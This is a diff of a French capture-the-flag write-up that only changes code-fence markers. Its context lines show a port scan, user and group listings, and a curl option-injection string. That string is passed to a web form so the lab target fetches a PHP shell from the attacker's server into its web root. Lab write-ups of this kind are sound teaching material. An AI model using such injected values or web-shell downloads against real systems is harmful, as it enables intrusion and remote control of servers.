@@ -17,7 +17,7 @@ Pour finir on a affaire ici à une machine Linux.
 
 Un scan rapide des ports TCP nous indique l'existence d'un site web (Sunny Security) et de serveurs mails (SMTP et IMAP) :  
 
-```plain
+```
 Nmap scan report for 10.1.1.60
 Host is up (0.045s latency).
 Not shown: 65528 closed ports
@@ -143,7 +143,7 @@ Grave erreur puisque l'on peut alors passer des options à cURL et notamment la 
 
 On va donc partager un shell PHP via un serveur web temporaire et le faire rapatrier sur notre victime et passant la chaîne suivante au formulaire :  
 
-```plain
+```
 http://10.254.0.29:8000/shell.php -o /var/www/html/devloop.php
 ```
 
@@ -156,7 +156,7 @@ Flowers Powers
 
 C'est journée portes ouvertes pour ce cher *Alex* :  
 
-```plain
+```
 /home/alex:
 total 16
 drwxr-xr-x 1 alex alex   78 Mar 21 17:53 .
@@ -235,7 +235,7 @@ vethF44XWR: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
 
 Le cache ARP contient une adresse concernant l'interface lxdbr0 :  
 
-```plain
+```
 cache arp
 ? (10.111.212.202) at 00:16:3e:7b:9c:22 [ether] on lxdbr0
 ```
@@ -250,7 +250,7 @@ Ceci explique pourquoi on s'est retrouvé dans le container... Mais comment en s
 
 Si notre utilisateur a les idées par très claires en revanche ses GIDs sont plus intéressants :p   
 
-```plain
+```
 uid=1000(alex) gid=1000(alex) groups=1000(alex),24(cdrom),30(dip),46(plugdev),119(lpadmin),125(sambashare),997(lxd)
 ```
 
